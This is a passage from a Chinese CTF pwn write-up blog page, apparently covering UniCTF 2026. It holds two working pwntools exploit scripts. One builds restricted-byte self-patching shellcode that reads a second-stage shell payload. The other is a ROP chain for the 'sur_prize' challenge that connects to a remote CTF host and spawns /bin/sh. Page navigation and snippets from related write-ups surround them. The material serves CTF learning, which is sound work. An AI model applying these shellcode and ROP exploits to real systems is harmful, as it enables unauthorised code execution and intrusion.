<span class="token keyword">def</span> <span class="token function">reach_al</span><span class="token punctuation">(</span>cur<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">:</span>
    diff <span class="token operator">=</span> <span class="token punctuation">(</span>target <span class="token operator">-</span> cur<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span>
    seq <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> v <span class="token keyword">in</span> ALLOWED_ADD<span class="token punctuation">:</span>
        <span class="token keyword">while</span> diff <span class="token operator">>=</span> v<span class="token punctuation">:</span>
            seq<span class="token punctuation">.</span>append<span class="token punctuation">(</span>v<span class="token punctuation">)</span>
            diff <span class="token operator">-=</span> v
    out <span class="token operator">=</span> <span class="token string">b""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>add_eax_imm8<span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> seq<span class="token punctuation">)</span>
    <span class="token keyword">return</span> out<span class="token punctuation">,</span> target


<span class="token keyword">def</span> <span class="token function">patch_and_exec_base</span><span class="token punctuation">(</span>base<span class="token operator">=</span><span class="token number">0x90</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">assert</span> base <span class="token keyword">in</span> ALLOWED
    <span class="token keyword">return</span> <span class="token string">b"\x00\x05\x05\x00\x00\x00"</span> <span class="token operator">+</span> <span class="token string">b"\xE9\x00\x00\x00\x00"</span> <span class="token operator">+</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>base<span class="token punctuation">]</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">emit_exec_opcode</span><span class="token punctuation">(</span>cur_al<span class="token punctuation">,</span> opcode_byte<span class="token punctuation">,</span> follow<span class="token operator">=</span><span class="token string">b""</span><span class="token punctuation">,</span> base<span class="token operator">=</span><span class="token number">0x90</span><span class="token punctuation">,</span> post_al<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    need_al <span class="token operator">=</span> <span class="token punctuation">(</span>opcode_byte <span class="token operator">-</span> base<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span>
    adj<span class="token punctuation">,</span> cur_al <span class="token operator">=</span> reach_al<span class="token punctuation">(</span>cur_al<span class="token punctuation">,</span> need_al<span class="token punctuation">)</span>
    out <span class="token operator">=</span> adj <span class="token operator">+</span> patch_and_exec_base<span class="token punctuation">(</span>base<span class="token operator">=</span>base<span class="token punctuation">)</span> <span class="token operator">+</span> follow
    <span class="token keyword">if</span> post_al <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        cur_al <span class="token operator">=</span> post_al <span class="token operator">&amp;</span> <span class="token number">0xFF</span>
    <span class="token keyword">return</span> out<span class="token punctuation">,</span> cur_al


<span class="token keyword">def</span> <span class="token function">emit_push_imm8</span><span class="token punctuation">(</span>cur_al<span class="token punctuation">,</span> imm8<span class="token punctuation">)</span><span class="token punctuation">:</span>
    out<span class="token punctuation">,</span> cur_al <span class="token operator">=</span> emit_exec_opcode<span class="token punctuation">(</span>cur_al<span class="token punctuation">,</span> <span class="token number">0x6A</span><span class="token punctuation">)</span>
    out <span class="token operator">+=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>imm8<span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> out<span class="token punctuation">,</span> cur_al


<span class="token keyword">def</span> <span class="token function">emit_pop</span><span class="token punctuation">(</span>cur_al<span class="token punctuation">,</span> reg_pop_opcode<span class="token punctuation">,</span> post_al<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> emit_exec_opcode<span class="token punctuation">(</span>cur_al<span class="token punctuation">,</span> reg_pop_opcode<span class="token punctuation">,</span> post_al<span class="token operator">=</span>post_al<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">pick_disp_at_least</span><span class="token punctuation">(</span>min_len<span class="token punctuation">)</span><span class="token punctuation">:</span>
    cands <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x0D</span><span class="token punctuation">,</span> <span class="token number">0x15</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token number">0xE9</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> d <span class="token keyword">in</span> cands<span class="token punctuation">:</span>
        <span class="token keyword">if</span> d <span class="token operator">>=</span> min_len<span class="token punctuation">:</span>
            <span class="token keyword">return</span> d
    <span class="token keyword">return</span> <span class="token number">0xE9</span>


cur_al <span class="token operator">=</span> <span class="token number">0</span>
stage1 <span class="token operator">=</span> <span class="token string">b""</span>

<span class="token comment"># rsi = rbx</span>
chunk<span class="token punctuation">,</span> cur_al <span class="token operator">=</span> emit_exec_opcode<span class="token punctuation">(</span>cur_al<span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">)</span>  <span class="token comment"># push rbx</span>
stage1 <span class="token operator">+=</span> chunk
chunk<span class="token punctuation">,</span> cur_al <span class="token operator">=</span> emit_exec_opcode<span class="token punctuation">(</span>cur_al<span class="token punctuation">,</span> <span class="token number">0x5E</span><span class="token punctuation">)</span>  <span class="token comment"># pop rsi</span>
stage1 <span class="token operator">+=</span> chunk

<span class="token comment"># rdx = READ_N (push imm8 会符号扩展，所以 imm8 必须 &lt; 0x80)</span>
chunk<span class="token punctuation">,</span> cur_al <span class="token operator">=</span> emit_push_imm8<span class="token punctuation">(</span>cur_al<span class="token punctuation">,</span> READ_N<span class="token punctuation">)</span>
stage1 <span class="token operator">+=</span> chunk
chunk<span class="token punctuation">,</span> cur_al <span class="token operator">=</span> emit_pop<span class="token punctuation">(</span>cur_al<span class="token punctuation">,</span> <span class="token number">0x5A</span><span class="token punctuation">)</span>  <span class="token comment"># pop rdx</span>
stage1 <span class="token operator">+=</span> chunk

<span class="token comment"># 设置 AL=2，用于把后面的 0D patch 成 0F</span>
adj<span class="token punctuation">,</span> cur_al <span class="token operator">=</span> reach_al<span class="token punctuation">(</span>cur_al<span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">)</span>
stage1 <span class="token operator">+=</span> adj

<span class="token comment"># 预计算：push 0; pop rax（pop rax 后 AL=0）</span>
late <span class="token operator">=</span> <span class="token string">b""</span>
late_chunk<span class="token punctuation">,</span> _ <span class="token operator">=</span> emit_push_imm8<span class="token punctuation">(</span>cur_al<span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">)</span>
late <span class="token operator">+=</span> late_chunk
late_chunk<span class="token punctuation">,</span> _ <span class="token operator">=</span> emit_pop<span class="token punctuation">(</span>cur_al<span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> post_al<span class="token operator">=</span><span class="token number">0x00</span><span class="token punctuation">)</span> <span class="token comment"># rax有异，0x80刚好可以拼成pop rax</span>
late <span class="token operator">+=</span> late_chunk

<span class="token comment"># 选择一个允许的 disp，让 patch 指向 syscall 占位符的第一个字节</span>
<span class="token comment"># patch 指令长度 6，目标 = patch_next_rip + disp</span>
<span class="token comment"># 这里令 disp = padding + len(late)</span>
disp <span class="token operator">=</span> pick_disp_at_least<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>late<span class="token punctuation">)</span><span class="token punctuation">)</span>
padding <span class="token operator">=</span> disp <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>late<span class="token punctuation">)</span>

<span class="token comment"># add byte ptr [rip+disp], al  (disp32 = disp)</span>
stage1 <span class="token operator">+=</span> <span class="token string">b"\x00\x05"</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>disp<span class="token punctuation">)</span>

<span class="token comment"># padding（不改寄存器）</span>
stage1 <span class="token operator">+=</span> <span class="token string">b"\x90"</span> <span class="token operator">*</span> padding

<span class="token comment"># rax=0，然后紧接着执行被 patch 的 syscall（read）</span>
stage1 <span class="token operator">+=</span> late

<span class="token comment"># syscall 占位符（会被上面的 patch 从 0d05 变成 0f05）</span>
stage1 <span class="token operator">+=</span> <span class="token string">b"\x0D\x05"</span>

<span class="token comment"># syscall 返回后：RAX == 实际读到的字节数（我们确保等于 READ_N）</span>
cur_al <span class="token operator">=</span> READ_N

<span class="token comment"># ret：栈顶在进入 shellcode 时就是 rbx，所以 ret 会跳到 rbx（stage2）</span>
chunk<span class="token punctuation">,</span> cur_al <span class="token operator">=</span> emit_exec_opcode<span class="token punctuation">(</span>cur_al<span class="token punctuation">,</span> <span class="token number">0xC3</span><span class="token punctuation">)</span>
stage1 <span class="token operator">+=</span> chunk
<span class="token comment">#gdb.attach(p)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>stage1<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"[+]"</span><span class="token punctuation">)</span>

stage2 <span class="token operator">=</span> <span class="token string">b"\x90"</span> <span class="token operator">*</span> <span class="token number">0x20</span> <span class="token operator">+</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>stage2<span class="token punctuation">)</span> <span class="token operator">></span> READ_N<span class="token punctuation">:</span>
    <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"stage2 too long: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>stage2<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string"> > </span><span class="token interpolation"><span class="token punctuation">&#123;</span>READ_N<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
stage2 <span class="token operator">=</span> stage2<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span>READ_N<span class="token punctuation">,</span> <span class="token string">b"\x90"</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>stage2<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="sur-prize"><a href="#sur-prize" class="headerlink" title="sur_prize"></a>sur_prize</h2><p>莫名奇妙的一道题，输入的第一个地址就覆盖了返回地址，导致无法设置rbp，栈迁移打不出来</p>
<p>虽然可以用pop rbp设置，但是输入函数居然是rsp寻址，而两个指令执行函数都是rbp寻址，这导致把rbp改到bss段之后没法往上任意写</p>
<p>发现直接跳转到0x401100处执行printf，恰好输出0字节，rax为0，然后跳转到一个借助rbp设置寄存器的syscall ret完成bss段任意写就好了</p>
<p>感觉printf这么用很莫名奇妙，这真是预期解吗<br><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">"amd64"</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">"linux"</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">"debug"</span><span class="token punctuation">,</span> terminal<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span> <span class="token string">"splitw"</span><span class="token punctuation">,</span> <span class="token string">"-h"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token comment">#p = process("./vuln")</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"nc1.ctfplus.cn"</span><span class="token punctuation">,</span> <span class="token number">13092</span><span class="token punctuation">)</span>
time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>

bin_ls <span class="token operator">=</span> <span class="token number">0x401657</span> 
bin_cat <span class="token operator">=</span> <span class="token number">0x004016A2</span> 
bss_addr <span class="token operator">=</span> <span class="token number">0x0404000</span> <span class="token operator">+</span> <span class="token number">0x800</span>
leave_ret <span class="token operator">=</span> <span class="token number">0x00401399</span>
gets_addr <span class="token operator">=</span> <span class="token number">0x40174F</span>
pop_rbp <span class="token operator">=</span> <span class="token number">0x00040125d</span>
printf <span class="token operator">=</span> <span class="token number">0x00401100</span>
sys1 <span class="token operator">=</span> <span class="token number">0x00000040168e</span>
sys <span class="token operator">=</span> <span class="token number">0x000000401689</span>
syscall <span class="token operator">=</span> <span class="token number">0x0040169D</span> 
add_rsp_ret <span class="token operator">=</span> <span class="token number">0x000401016</span>
printf_addr <span class="token operator">=</span> <span class="token number">0x004015DE</span>  
ret <span class="token operator">=</span> <span class="token number">0x040101a</span>
bin_sh <span class="token operator">=</span> bss_addr <span class="token operator">+</span> <span class="token number">0x68</span>

p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b"a"</span><span class="token punctuation">)</span>
time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>

<span class="token comment"># 栈迁移</span>
payload <span class="token operator">=</span> <span class="token string">b""</span>
<span class="token comment">#payload += p64(leave_ret)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rbp<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span>
<span class="token comment">#payload += p64(bss_addr)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>printf<span class="token punctuation">)</span> <span class="token comment">#什么也不输出，然后把rax设置为0</span>
<span class="token comment">#payload += p64(printf_addr) </span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>sys1<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>sys<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rbp<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bss_addr <span class="token operator">+</span> <span class="token number">0x20</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>sys<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

<span class="token comment"># get shell，懒得定位最后会落到哪个bin_sh上遂多复制了几个</span>
p2 <span class="token operator">=</span> <span class="token string">b""</span> 
p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rbp<span class="token punctuation">)</span>
p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span>
p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>sys<span class="token punctuation">)</span>
p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span>
p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span>
p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span>
p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span>
p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span>
p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span>
p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span>
p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span>
p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span>
p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span>
p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span>
p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span>
p2 <span class="token operator">+=</span> <span class="token string">b"/bin/sh\x00"</span>
<span class="token comment">#gdb.attach(p)</span>

time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p2<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwn/">pwn</a></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/01/18/tauri-2-%E8%87%AA%E5%8A%A8%E6%9B%B4%E6%96%B0/" title="tauri-2 自动更新"><img class="cover" src="/image/cover47_puzzle.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">tauri-2 自动更新</div></div><div class="info-2"><div class="info-item-1">用tauri做项目已经不陌生了，就记录发布之后如何完成自动更新这一步吧 项目代码配置cargo.toml里加上tauri-plugin-updater = "2.9.0" tauri-plugin-process = "2.3.1" 相应的tauri::Builder里补充两行.plugin(tauri_plugin_updater::Builder::new().build()) .plugin(tauri_plugin_process::init()) tauri.conf.json里，plugins里加上"bundle": &#123;     "active": true,     "targets": "all",     "createUpdaterArtifacts": true,   &#125;, "plugins": &#123;     "updater": &#123;         "pubkey": "",         "endpoints": [            ...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/11/15/VenomCTF-WP/" title="VenomCTF WP"><img class="cover" src="/image/cover40_wizard.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">VenomCTF WP</div></div><div class="info-2"><div class="info-item-1">good_night初看朝阳东升，不解题中意，再看四野寂寂，已成题中人 指早八看到这道题晚八还没解出来，good night 程序有栈溢出，反复地读然后复制到会越界的地方，约等于一个多一字节溢出，可以把返回地址改成leave ret 然后给了一个bss段读，可以进行布置，开始rop。 题目说预期解是ret2ld，又提示可以考虑使用ret2dl来泄漏libc地址，再提示ret2dl不单可以调用函数也可以尝试调用libc中的gadget，总结下来就是不会 never一个沙盒环境，禁了execve、read、write及部分变体，然后给了一个固定的页并执行 考虑ORW，open没有禁，read可以用mmap映射完成读，但是w缺失，考虑用一些状态间接反应 调试时发现程序段错误会有输出，启动脚本会报错，所以经过设计，逐字节mmap 当前目录下的flag文件，然后和指定字符比较，如果一致转去执行一个触发段错误的指令，不一致则exit，无报错输出 然后爆破： from pwn import * context(arch='amd64', os='linux',...</div></div></div></a><a class="pagination-related" href="/2025/10/26/moectf-2025/" title="Moectf 2025"><img class="cover" src="/image/cover36_door.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-10-26</div><div class="info-item-2">Moectf 2025</div></div><div class="info-2"><div class="info-item-1">一份迟到的不必要的WP，同时也是回顾si进pwn的世界的第一个月 0 二进制漏洞审计入门指北真正的梦开始的地方，从熟悉流程开始，题目里把解题脚本直接给了出来：from pwn import *                                    # 导入 pwntools。 context(arch='amd64', os='linux', log_level='debug') # 一些基本的配置。  # 有时我们需要在本地调试运行程序，需要配置 context.terminal。详见入门指北。  # io = process('./pwn')             # 在本地运行程序。 # gdb.attach(io)                    # 启动 GDB io = connect(???, ???)              # 与在线环境交互。 io.sendline(b'114511')              # 什么时候用 send 什么时候用 sendline？  payload  = p32(0xdeadbeef)    ...</div></div></div></a><a class="pagination-related" href="/2025/09/20/pwn_%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/" title="pwn“cache”"><img class="cover" src="/image/cover33_book.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-20</div><div class="info-item-2">pwn“cache”</div></div><div class="info-2"><div class="info-item-1">整理记录用到的命令，以避免每次用到查一遍 环境docker ps查看运行的容器 docker exec -it ? /bin/bash进入?id的容器终端 chmod +x &lt;file&gt; 增加可执行权限 tty vim ~/.gdbinit  set context-output /dev/pts/?  设置gdb输出位置 source /pip_venv/bin/activate进入python虚拟环境 tmux进入tmux终端 链接很多时候需要和远程统一库函数，以及符合要求的ld ldd pwn查看pwn文件的链接情况 patchelf --replace-needed libc.so.6 ./libc.so.6 pwn用当前文件夹下的libc.so.6替换pwn需要的链接库patchelf --replace-needed ./libc.so.6 libc.so.6 pwn改回系统链接库 strings ./libc.so.6 | grep GNU 查找符合要求的ld版本信息，如果题目提供的话就不需要了 patchelf --set-interpreter...</div></div></div></a><a class="pagination-related" href="/2025/10/12/tsctf-2025/" title="tsctf 2025"><img class="cover" src="/image/cover34_castle.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-10-12</div><div class="info-item-2">tsctf 2025</div></div><div class="info-2"><div class="info-item-1">ret签到题，明摆着的栈溢出和后门函数，略 from pwn import * context(arch='amd64', os='linux', log_level='debug') context.terminal = ['tmux', 'splitw', '-h']  ret_addr = 0x400501 backdoor = 0x0400676 io = connect("host.docker.internal", 64958)  io.recvuntil(b"sign-in!") payload = b"A"*(16 + 8) payload += p64(ret_addr) payload += p64(backdoor) io.sendline(payload) io.interactive() pop提示了ret2libc__int64 vuln() &#123;   _BYTE v1[16]; // [rsp+0h] [rbp-10h] BYREF    puts("No backdoors this time!");   return...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="giscus-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/auceptin-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Auceptin</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">42</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">35</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/auceptinFang"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">welcome to my blog! <br> Contact：me@aucept.in</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%EF%BC%9F%E6%88%91%E4%B8%8D%E6%98%AF%E6%B1%87%E7%BC%96%E9%AB%98%E6%89%8B%E5%90%97%EF%BC%9F"><span class="toc-number">1.</span> <span class="toc-text">什么？我不是汇编高手吗？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Uni-check"><span class="toc-number">2.</span> <span class="toc-text">Uni_check</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#speak"><span class="toc-number">3.</span> <span class="toc-text">speak</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#smcode"><span class="toc-number">4.</span> <span class="toc-text">smcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sur-prize"><span class="toc-number">5.</span> <span class="toc-text">sur_prize</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/02/03/UniCTF/" title="UniCTF 2026 WP"><img src="/image/cover48_shooting_star.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="UniCTF 2026 WP"/></a><div class="content"><a class="title" href="/2026/02/03/UniCTF/" title="UniCTF 2026 WP">UniCTF 2026 WP</a><time datetime="2026-02-03T02:00:17.000Z" title="发表于 2026-02-03 10:00:17">2026-02-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/18/tauri-2-%E8%87%AA%E5%8A%A8%E6%9B%B4%E6%96%B0/" title="tauri-2 自动更新"><img src="/image/cover47_puzzle.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="tauri-2 自动更新"/></a><div class="content"><a class="title" href="/2026/01/18/tauri-2-%E8%87%AA%E5%8A%A8%E6%9B%B4%E6%96%B0/" title="tauri-2 自动更新">tauri-2 自动更新</a><time datetime="2026-01-18T15:09:19.000Z" title="发表于 2026-01-18 23:09:19">2026-01-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E6%8E%92%E5%BA%8F%E5%AE%9E%E9%AA%8C/" title="数据结构-排序实验"><img src="/image/cover44_glimpse.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="数据结构-排序实验"/></a><div class="content"><a class="title" href="/2025/12/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E6%8E%92%E5%BA%8F%E5%AE%9E%E9%AA%8C/" title="数据结构-排序实验">数据结构-排序实验</a><time datetime="2025-12-22T05:03:55.000Z" title="发表于 2025-12-22 13:03:55">2025-12-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/16/%E9%94%88%E5%8C%96%E7%9A%84%E5%A4%A7%E4%BD%9C%E4%B8%9A/" title="锈化的大作业"><img src="/image/cover46_pray.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="锈化的大作业"/></a><div class="content"><a class="title" href="/2025/12/16/%E9%94%88%E5%8C%96%E7%9A%84%E5%A4%A7%E4%BD%9C%E4%B8%9A/" title="锈化的大作业">锈化的大作业</a><time datetime="2025-12-16T04:11:59.000Z" title="发表于 2025-12-16 12:11:59">2025-12-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/12/Oauth2-%E4%B8%8E-OIDC/" title="OAuth 2.0 与 OIDC"><img src="/image/cover43_together.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="OAuth 2.0 与 OIDC"/></a><div class="content"><a class="title" href="/2025/12/12/Oauth2-%E4%B8%8E-OIDC/" title="OAuth 2.0 与 OIDC">OAuth 2.0 与 OIDC</a><time datetime="2025-12-12T11:31:14.000Z" title="发表于 2025-12-12 19:31:14">2025-12-12</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/foot.jpg);"><div id="footer-wrap"><div class="copyright">&copy;2025 - 2026 By Auceptin</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas 